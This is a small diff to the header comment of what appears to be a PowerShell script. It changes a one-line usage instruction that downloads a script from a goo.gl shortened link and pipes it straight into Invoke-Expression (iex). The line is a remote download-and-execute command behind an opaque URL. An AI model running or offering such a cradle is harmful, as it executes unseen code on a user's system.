@@ -12,7 +12,7 @@
 #	(Both licensed under Open Source licenses)								    #
 #														    #
 #	Short URL: https://goo.gl/uIVXKD							                    #
-#	(new-object Net.WebClient).DownloadString('https://goo.gl/tb38WQ') | iex				    #
+#	(new-object Net.WebClient).DownloadString('https://goo.gl/uIVXKD') | iex				    #
 #														    #
 #####################################################################################################################
 
